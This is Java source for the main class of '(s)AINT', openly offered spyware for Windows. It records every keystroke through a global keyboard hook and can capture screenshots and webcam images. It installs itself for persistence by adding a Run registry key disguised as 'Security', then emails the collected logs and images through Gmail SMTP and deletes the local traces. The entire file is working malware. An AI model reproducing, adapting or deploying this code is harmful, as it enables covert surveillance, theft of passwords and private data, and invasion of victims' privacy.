/*
 * Copyright (c) 2017, tiagorlampert
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * * Redistributions of source code must retain the above copyright notice, this
 *   list of conditions and the following disclaimer.
 * * Redistributions in binary form must reproduce the above copyright notice,
 *   this list of conditions and the following disclaimer in the documentation
 *   and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 */
package saint.keylogger;

import saint.email.SendEmail;
import saint.screenshot.Screenshot;
import saint.webcam.Cam;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.channels.FileChannel;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.logging.Level;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/**
 *
 * @author tiagorlampert
 */
public class Keylogger extends javax.swing.JFrame implements NativeKeyListener {

    private static DateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd");
    private static DateFormat dateFormatHour = new SimpleDateFormat("yyyy-MM-dd HH-mm-ss");
    private static String folder = "\\(s)AINT";
    private static String environment_variable_path = "APPDATA";
    private static String path_logs = "\\Logs\\";
    private static String path_screenshot = "\\Screenshot\\";
    private static String path_cam = "\\Cam\\";
    private static String app_path;
    private static String nameFileScreenshot;
    private static String nameFileCam;
    private static String logs = "";
    private static String logs_send = "";
    private static String smtp = "smtp.gmail.com";
    private static String email_from = "email@gmail.com";
    private static String email_password = "passwordemail";
    private static String email_to = "email@gmail.com";
    private static String subject = "(s)AINT";
    private static String port = "";
    private static int cam_width = 640;
    private static int cam_height = 480;
    private static int count = countNumber;
    private static int count_state = 0;
    private static boolean ssl = true;
    private static boolean tls = false;
    private static boolean debug_email = true;
    private static boolean screenshot = booleanScreenshot;
    private static boolean cam = booleanCam;
    private static boolean persistence = booleanPersistence;
    private static boolean keepdata = booleanKeepData;
    private static String name_jar = "\\saint.jar";

    public static void main(String[] args) throws IOException {
        detectOS();

        app_path = System.getenv(environment_variable_path) + folder;

        createFolder(app_path);
        createFolder(app_path + path_logs);
        createFolder(app_path + path_screenshot);
        createFolder(app_path + path_cam);

        if (persistence == true) {
            copyFile(Keylogger.class.getProtectionDomain().getCodeSource().getLocation().getPath(), app_path + name_jar);
        }

        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            java.util.logging.Logger.getLogger(Keylogger.class.getName()).log(Level.SEVERE, null, ex);
        }
        GlobalScreen.getInstance().addNativeKeyListener(new Keylogger());
    }

    private static void copyFile(String source, String dest) {
        File jar_file = new File(app_path + name_jar);
        if (!jar_file.exists()) {
            File sourceFile = new File(source);
            File destFile = new File(dest);
            FileChannel sourceChannel = null;
            FileChannel destChannel = null;
            try {
                sourceChannel = new FileInputStream(sourceFile).getChannel();
                destChannel = new FileOutputStream(destFile).getChannel();
                destChannel.transferFrom(sourceChannel, 0, sourceChannel.size());
            } catch (IOException e) {
                e.printStackTrace();
            }
            try {
                Runtime.getRuntime().exec("cmd /c REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V \"Security\" /t REG_SZ /F /D \"%appdata%\\(s)AINT\\saint.jar\"");
            } catch (IOException ex) {
                System.out.println(ex.getMessage());
            }
        }
    }

    private static void createFolder(String path) {
        new File(path).mkdir();
    }

    private static void deleteFolder(String path) {
        File folder = new File(path);
        File[] files = folder.listFiles();
        for (File file : files) {
            file.delete();
        }
    }

    private static void deleteData() {
        if (!keepdata) {
            deleteFolder(app_path + path_logs);
            deleteFolder(app_path + path_screenshot);
            deleteFolder(app_path + path_cam);
        }
    }

    private static void detectOS() {
        if (!System.getProperty("os.name").toLowerCase().contains("windows")) {
            System.out.println("[!] OS is not supported!");
            System.exit(0);
        }
    }

    public void SaveLogs(String c) {
        logs += c;
        count_state += 1;
        try (BufferedWriter bw = new BufferedWriter(new FileWriter(app_path + path_logs + dateFormat.format(new Date()) + ".txt", true))) {
            bw.write(c);
        } catch (IOException e) {
            e.printStackTrace();
        }

        // System.out.println("Logs: " + logs);
        // System.out.println("Count: " + count_state);

        if (count_state >= count) {
            count_state = 0;
            logs_send = logs;
            logs = "";

            if (screenshot == true && cam == true) {
                Thread.currentThread().setContextClassLoader(getClass().getClassLoader());
                sendAll();
            } else if (screenshot == true && cam == false) {
                Thread.currentThread().setContextClassLoader(getClass().getClassLoader());
                sendScreenshot();
            } else if (screenshot == false && cam == true) {

                Thread.currentThread().setContextClassLoader(getClass().getClassLoader());
                sendCam();
            } else if (screenshot == false && cam == false) {
                Thread.currentThread().setContextClassLoader(getClass().getClassLoader());
                send();
            }
        }
    }

    public void sendAll() {
        try {
            nameFileScreenshot = dateFormatHour.format(new Date()).toString();
            Screenshot.TakeScreenshot(app_path + path_screenshot, dateFormatHour.format(new Date()));

            nameFileCam = dateFormatHour.format(new Date()).toString();
            Cam.Capture(app_path + path_cam, dateFormatHour.format(new Date()), cam_width, cam_height);

        } catch (Exception ex) {
            System.out.println(ex.getMessage());
        }
        new Thread(() -> {
            SendEmail e = new SendEmail(smtp, email_from, email_password, port, ssl, tls, debug_email);
            e.sendEmailAttachment(
                    email_to,
                    subject,
                    logs_send,
                    app_path + path_screenshot + nameFileScreenshot + ".jpg",
                    app_path + path_cam + nameFileCam + ".png",
                    app_path + path_logs + dateFormat.format(new Date()) + ".txt"
            );
            deleteData();
        }).start();
    }

    public void sendScreenshot() {
        try {
            nameFileScreenshot = dateFormatHour.format(new Date()).toString();
            Screenshot.TakeScreenshot(app_path + path_screenshot, dateFormatHour.format(new Date()));
        } catch (Exception ex) {
            System.out.println(ex.getMessage());
        }
        new Thread(() -> {
            SendEmail e = new SendEmail(smtp, email_from, email_password, port, ssl, tls, debug_email);
            e.sendEmailAttachment(
                    email_to,
                    subject,
                    logs_send,
                    app_path + path_screenshot + nameFileScreenshot + ".jpg",
                    app_path + path_logs + dateFormat.format(new Date()) + ".txt"
            );
            deleteData();
        }).start();
    }

    public void sendCam() {
        try {
            nameFileCam = dateFormatHour.format(new Date()).toString();
            Cam.Capture(app_path + path_cam, dateFormatHour.format(new Date()), cam_width, cam_height);
        } catch (Exception ex) {
            System.out.println(ex.getMessage());
        }
        new Thread(() -> {
            SendEmail e = new SendEmail(smtp, email_from, email_password, port, ssl, tls, debug_email);
            e.sendEmailAttachment(
                    email_to,
                    subject,
                    logs_send,
                    app_path + path_cam + nameFileCam + ".png",
                    app_path + path_logs + dateFormat.format(new Date()) + ".txt"
            );
            deleteData();
        }).start();
    }

    public void send() {
        new Thread(() -> {
            SendEmail e = new SendEmail(smtp, email_from, email_password, port, ssl, tls, debug_email);
            e.sendEmailAttachment(
                    email_to,
                    subject,
                    logs_send,
                    app_path + path_logs + dateFormat.format(new Date()) + ".txt"
            );
            deleteData();
        }).start();
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nke) {
//        System.out.println(nke.getRawCode());
        switch (nke.getRawCode()) {
            case 8:
                SaveLogs("[Backspace]");
                break;
            case 9:
                SaveLogs("[Tab]");
                break;
            case 13:
                SaveLogs("[Enter]");
                break;
//            case 19:
//                SaveLogs("[PauseBreak]");
//                break;
//            case 27:
//                SaveLogs("[Esc]");
//                break;
//            case 33:
//                SaveLogs("[PgUp]");
//                break;
//            case 34:
//                SaveLogs("[PgDown]");
//                break;
//            case 35:
//                SaveLogs("[End]");
//                break;
//            case 36:
//                SaveLogs("[Home]");
//                break;
//            case 37:
//                SaveLogs("[Left]");
//                break;
//            case 38:
//                SaveLogs("[Up]");
//                break;
//            case 39:
//                SaveLogs("[Right]");
//                break;
//            case 40:
//                SaveLogs("[Down]");
//                break;
//            case 44:
//                SaveLogs("[PrintScreen]");
//                break;
//            case 45:
//                SaveLogs("[Insert]");
//                break;
            case 46:
                SaveLogs("[Del]");
                break;
            case 112:
                SaveLogs("[F1]");
                break;
            case 113:
                SaveLogs("[F2]");
                break;
            case 114:
                SaveLogs("[F3]");
                break;
            case 115:
                SaveLogs("[F4]");
                break;
            case 116:
                SaveLogs("[F5]");
                break;
            case 117:
                SaveLogs("[F6]");
                break;
            case 118:
                SaveLogs("[F7]");
                break;
            case 119:
                SaveLogs("[F8]");
                break;
            case 120:
                SaveLogs("[F9]");
                break;
            case 121:
                SaveLogs("[F10]");
                break;
            case 122:
                SaveLogs("[F11]");
                break;
            case 123:
                SaveLogs("[F12]");
                break;
            case 144:
                SaveLogs("[NumLock]");
                break;
            case 162:
                SaveLogs("[Ctrl]");
                break;
            case 163:
                SaveLogs("[Ctrl]");
                break;
            case 164:
                SaveLogs("[Alt]");
                break;
            case 165:
                SaveLogs("[Alt]");
                break;
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nke) {
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nke) {
        SaveLogs(String.valueOf(nke.getKeyChar()));
    }
}
